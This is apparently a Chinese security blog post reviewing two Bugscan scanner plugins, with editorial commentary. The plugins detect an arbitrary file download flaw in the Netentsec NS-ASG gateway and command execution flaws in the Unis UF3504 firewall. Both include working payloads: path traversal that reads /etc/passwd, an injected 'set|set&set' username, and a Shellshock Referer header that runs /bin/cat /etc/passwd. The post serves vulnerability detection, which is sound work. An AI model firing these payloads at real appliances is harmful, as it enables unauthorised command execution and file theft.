绿盟、启明星辰、铱讯三家厂商分别给出了回应，至于怎么回应的，其实你可以自己去看看喽。值得一提的是，在铱讯回应里面，对该漏洞提出了质疑，怀疑是“某华东厂商”。大家都在想这个某华东厂商是谁的时候，安恒发布了一条《郑重声明》，撇开与这个事的关系啦。

第一发：网康 NS-ASG 应用安全网关任意文件下载

插件作者： yichin

贡献级别：核心

插件代码 

#!usr/bin/env python

# *-* coding:utf-8 *-*


'''

name: NS-ASG Arbitrarily File Download

author: yichin

refer: http://www.wooyun.org/bugs/wooyun-2014-058932

refer: http://www.wooyun.org/bugs/wooyun-2015-097832

'''



def assign(service, arg):

    if service == 'ns-asg':

        return True, arg


def audit(arg):

    payloads = [

        arg + 'admin/cert_download.php?file=acdefghijk&certfile=certs/../../../../../../../../etc/passwd',

        arg + 'commonplugin/Download.php?reqfile=../../../../../etc/passwd',

    ]

    for payload in payloads:

        # 发送请求

        code, head, res, err, _ = curl.curl2(payload)

        ＃ 判断回显

        if (code==200) and ('root:' in res):

            security_hole('Arbitrarily file download: ' + payload)


if __name__ == '__main__':

    from dummy import *

    audit(assign('ns-asg','http://www.example.com/')[1])





 小编快评 
  这个插件对应的漏洞是《网康 NS-ASG 应用安全网关任意文件下载漏洞》，任意文件下载漏洞编写起来也是灰常灰常容易啦。任意文件下载是有两处下载点的，admin/cert_download.php 和 commonplugin/Download.php， 作者将这两个下载点和对应的 Payload 全部放置进了一个 list 里，逐个访问目标地址，然后看返回的页面里面有没有要下载的文件内容。比如这里我们下载的文件是 /etc/passwd 文件，这个文件里面肯定保存着 root 这个账号，所以就检测是不是有这个字符就可以啦。

   这里值得注意的是，如果批量全网扫的时候，这样写的肯定是会存在误报的，但是 Bugscan  框架本身会对目标进行指纹验证，看到 assign 函数那里的 ns-asg 了吗？对就是这个，极大程度上把误报率降了下来。吼吼吼，套路，都是套路。

第二发：清华紫光硬件网关防火墙UF3504 3.0版型号命令执行2处

插件作者： boy

贡献级别：核心

插件代码

#!/usr/bin/env python

# -*- coding: utf-8 -*-

# ref: http://www.wooyun.org/bugs/wooyun-2010-0114593


import urlparse



def assign(service, arg):

    if service == "unis_gateway":

        arr = urlparse.urlparse(arg)

        return True, '%s://%s/' % (arr.scheme, arr.netloc)


def audit(arg):

    # 第一处命令执行检测

    url = arg + 'cgi-bin/UserManager'

    postdata = "login=%b5%c7%c2%bc&action=useraction&passwd=123456&username=%22set%7cset%26set%22"

    code, head, res, errcode, _ = curl.curl2(url, post=postdata)

    if code==200 and 'DOCUMENT_ROOT' in res:

        security_hole("清华紫光硬件防火墙UF3504 3.0版型号命令执行:http://www.wooyun.org/bugs/wooyun-2010-0115756")

    # 第二处命令执行检测

    code, head, res, errcode, _ = curl.curl2(arg, referer='() { :;}; echo  `/bin/cat /etc/passwd`')

    if code==200 and 'root' in head:

       security_hole("清华紫光硬件防火墙UF3504 3.0版型号BASH远程命令执行漏洞:Referer: () { :;}; echo  `/bin/cat /etc/passwd`")


if __name__ == '__main__':

    from dummy import *

    audit(assign('unis_gateway','http://www.example.com/')[1])


 小编快评 
   这个插件是 boy 大表哥在双蛋活动中与 yichin 大黑阔大战时的产物。该插件同时检测了两处命令执行漏洞，第一处是 cgi-bin/UserManager 处的漏洞，第二处是 Bash 破壳漏洞。

我们先看第一处，从详情处得到了目标 URL 地址，和要通过 POST 方式发送的 Payload, 调用我们框架中的 curl2 方法发送 HTTP 报文，这里的 Payload 执行的命令是 set|set&set 其实就是输出显示环境变量，那我们就从环境变量里面找到一个通用的字符串呗。作者选择了 DOCUMENT_ROOT 这个字符串。


再来看第二处的破壳漏洞，把 HTTP 头部的 Referer 字段值改成 Payload，通过 curl2 发送到服务器。
